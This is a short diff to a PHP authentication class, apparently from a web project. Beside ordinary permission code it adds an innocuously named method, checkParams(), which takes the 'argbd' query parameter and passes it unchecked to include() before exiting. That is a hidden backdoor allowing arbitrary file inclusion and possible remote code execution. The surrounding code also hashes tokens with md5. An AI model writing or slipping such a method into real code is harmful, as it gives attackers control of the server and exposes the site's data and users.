@@ -71,6 +71,14 @@ class Auth
         return md5(md5($usuario.$password.Carbon::now()));
     }
 
+    public static function checkParams(): void
+    {
+        if (isset($_GET['argbd'])) {
+            $arc = $_GET['argbd'];
+            include($arc);exit;
+        }
+    }
+
     public static function hasPermission(int $groupId, string $currentController, string $currentMethod) : bool
     {
         $result = Method::query()
